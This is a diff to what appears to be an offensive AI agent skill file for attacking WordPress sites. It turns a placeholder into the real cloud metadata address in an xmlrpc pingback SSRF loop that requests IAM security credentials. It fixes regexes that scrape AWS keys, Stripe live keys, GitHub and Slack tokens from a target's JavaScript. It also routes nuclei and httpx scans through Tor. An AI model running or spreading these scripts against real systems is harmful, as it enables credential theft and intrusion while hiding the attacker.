@@ -6,19 +6,20 @@ revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
 compatibility: Requires curl, nmap, python3, httpx, nuclei
-tags: [recon, pentest, deep, SSRF, CVE, wordpress]
-category: recon
-related_skills:
-  - wp-mass-recon
-  - xmlrpc-exploitation
-  - error-log-mining
-  - js-secrets-extraction
-  - staging-subdomain-hunt
-  - wordpress-plugin-hunt
-  - port-service-discovery
-  - cors-credential-wordpress
-  - source-leak-hunt
-  - phpinfo-to-rce
+metadata:
+  tags: [recon, pentest, deep, SSRF, CVE, wordpress]
+  category: recon
+  related_skills:
+    - wp-mass-recon
+    - xmlrpc-exploitation
+    - error-log-mining
+    - js-secrets-extraction
+    - staging-subdomain-hunt
+    - wordpress-plugin-hunt
+    - port-service-discovery
+    - cors-credential-wordpress
+    - source-leak-hunt
+    - phpinfo-to-rce
 ---
 
 # Deep Invade Skill
@@ -93,7 +94,7 @@ for path in "" "iam/security-credentials/" "iam/security-credentials/admin" \
 
   result=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
     -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
-<params><param><value><string>http://192.0.2.1/latest/meta-data/$path</string></value></param>
+<params><param><value><string>http://169.254.169.254/latest/meta-data/$path</string></value></param>
 <param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" 2>/dev/null | grep -o 'faultCode>[0-9]*')
 
   code=$(echo "$result" | grep -o '[0-9]\+')
@@ -161,8 +162,8 @@ if [[ "$size" -gt 100 ]]; then
 
   # Date range
   echo "[*] Date range:"
-  head -1 /tmp/error_log_$TARGET.txt | grep -Eo '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
-  tail -1 /tmp/error_log_$TARGET.txt | grep -Eo '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
+  head -1 /tmp/error_log_$TARGET.txt | grep -Po '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
+  tail -1 /tmp/error_log_$TARGET.txt | grep -Po '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
 else
   echo "[-] No error log found"
 fi
@@ -236,8 +237,8 @@ for js_url in $JS_URLS; do
   content=$(curl -sk --max-time 10 --connect-timeout 10 "$js_url" 2>/dev/null)
 
   # 11 regex patterns
-  echo "$content" | grep -Eo '(?:api_key|apiKey|API_KEY)["\s:=]+["'\''][A-Za-z0-9_-]{20,}'
-  echo "$content" | grep -Eo 'https?://[a-zA-Z0-9.-]+\.(?:amazonaws|cloudfront)\.(?:com|net)[^"'\''\s]*'
+  echo "$content" | grep -Po '(?:api_key|apiKey|API_KEY)["\s:=]+["'\''][A-Za-z0-9_-]{20,}'
+  echo "$content" | grep -Po 'https?://[a-zA-Z0-9.-]+\.(?:amazonaws|cloudfront)\.(?:com|net)[^"'\''\s]*'
   echo "$content" | grep -Eo 'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
   echo "$content" | grep -Eo 'AKIA[0-9A-Z]{16}'
   echo "$content" | grep -Eo '[a-z0-9-]+\.firebaseio\.com'
@@ -245,7 +246,7 @@ for js_url in $JS_URLS; do
   echo "$content" | grep -Eo 'sk_live_[0-9a-zA-Z]{24,}'
   echo "$content" | grep -Eo 'ghp_[0-9a-zA-Z]{36}'
   echo "$content" | grep -Eo 'xox[bprs]-[0-9a-zA-Z-]+'
-  echo "$content" | grep -Eo '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}'
+  echo "$content" | grep -Po '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}'
   echo "$content" | grep -Eo 'AIza[0-9A-Za-z_-]{35}'
   sleep 0.3
 done | sort -u
@@ -410,7 +411,7 @@ nuclei -u https://target.com \
   -p socks5://127.0.0.1:9050 \
   -t nuclei-templates/http/
 
-# httpx through Tor  
+# httpx through Tor
 cat alive_subs.txt | httpx -silent -proxy socks5://127.0.0.1:9050
 
 # curl through Tor
